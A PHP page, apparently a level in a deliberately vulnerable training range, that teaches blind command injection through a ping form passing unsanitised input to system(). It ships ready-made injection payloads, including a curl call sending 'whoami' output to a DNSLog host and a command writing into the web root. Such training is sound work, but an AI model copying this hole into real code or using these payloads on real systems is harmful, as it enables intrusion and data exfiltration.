<?php
/**
 * Pikachu-Enhanced v2.0 - 无回显命令盲注 (Blind RCE / Out-of-Band OOB) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[50] = 'active open';
$ACTIVE[227] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';

$html = '';
$user_host = $_POST['host'] ?? '';
$execution_time = 0;

if (isset($_POST['submit']) && !empty($user_host)) {
    $t_start = microtime(true);
    
    // 【核心漏洞点】：命令在后台执行，标准输出被重定向至 /dev/null 或 NUL，前端不回显任何执行数据
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = "ping -n 1 " . $user_host . " > NUL 2>&1";
    } else {
        $cmd = "ping -c 1 " . $user_host . " > /dev/null 2>&1";
    }
    
    @system($cmd);
    $execution_time = round(microtime(true) - $t_start, 3);

    $is_delayed = ($execution_time >= 1.8);
    $badge_class = $is_delayed ? "danger" : "info";
    $badge_text = $is_delayed ? "⏱️ 探测到显著命令执行延迟 (Sleep 成功触发)" : "⚡ 正常后台静默执行完成";

    $html = "<div class='alert alert-{$badge_class}' style='margin:0; border-radius:8px; font-weight:700;'>
        <div style='display:flex; justify-content:space-between; align-items:center;'>
            <span><i class='fa fa-clock-o'></i> 任务响应耗时: <span style='font-size:16px; color:#ef4444;'>{$execution_time} 秒</span></span>
            <span class='badge badge-{$badge_class}' style='font-size:12px; padding:4px 8px;'>{$badge_text}</span>
        </div>
        <hr style='margin:8px 0; border-color:rgba(0,0,0,0.1);' />
        <p style='margin:0; font-size:12.5px;'>后台日志反馈：异步任务已分发并执行，未捕获到前端显式输出。</p>
    </div>";
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="rce.php">RCE</a></li>
                <li class="active">无回显盲 RCE</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 无回显盲 RCE 探测思路" data-content="使用 sleep 2 进行时间盲注探测，或通过 curl http://dnslog.cn/`whoami` 将数据外带（OOB）！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🙈 关卡 4: 无回显命令盲注漏洞攻防教学 (Blind RCE & OOB 带外通道)
                        <span class="cyber-badge-chip">RCE · 无回显盲注 · DNSLog / OOB · 200 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        在许多异步消费队列、Webhook 回调或后台运维脚本中，系统命令的输出被重定向到 <code>/dev/null</code> 或系统日志文件，<b>前端页面绝对不返回任何回显文本</b>。渗透测试人员主要通过三种手段确认与利用：<b>时间延迟判定（Sleep/Ping）、带外通信（DNSLog / HTTP OOB 外带）以及重定向写文件至 Web 目录（<code>id &gt; res.txt</code>）</b>！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Control Form -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-terminal" style="color:var(--primary);"></i> 异步任务调度控制台
                            </h4>

                            <form method="POST" action="rce_blind.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">输入主机地址或盲注 Payload：</label>
                                    <input class="form-control" type="text" id="host_input" name="host" value="<?php echo htmlspecialchars($user_host); ?>" placeholder="127.0.0.1" style="font-family:monospace;" required />
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速测试盲 RCE Payload：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillHost('127.0.0.1')">
                                            <i class="fa fa-bolt" style="color:#06b6d4;"></i> 正常测试：<code>127.0.0.1</code> (无延迟)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillHost('127.0.0.1; sleep 2')">
                                            <i class="fa fa-clock-o" style="color:#ef4444;"></i> <b>时间盲注：</b> <code>127.0.0.1; sleep 2</code> (延时 2 秒)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillHost('127.0.0.1; curl http://dnslog.example.com/`whoami`')">
                                            <i class="fa fa-globe" style="color:#8b5cf6;"></i> <b>OOB 带外提取：</b> <code>curl http://dnslog/`whoami`</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillHost('127.0.0.1; id > /var/www/html/whoami.txt')">
                                            <i class="fa fa-file-text-o" style="color:#10b981;"></i> <b>文件重定向写盘：</b> <code>id > /var/www/html/whoami.txt</code>
                                        </button>
                                    </div>
                                </div>

                                <button type="submit" name="submit" value="submit" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:10px;">
                                    <i class="fa fa-send"></i> 提交并分发异步任务
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right Column: Status Feedback -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> 后台执行耗时监控
                            </h4>

                            <?php if (!empty($html)): echo $html; else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:30px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-eye-slash" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                                    在左侧提交带有延时或外带指令的 Payload 并观察耗时
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="rce_bypass.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：命令注入 WAF 绕过</a>
                    <a href="rce_ssti.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：服务端模板注入 SSTI <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillHost(v) {
    document.getElementById('host_input').value = v;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
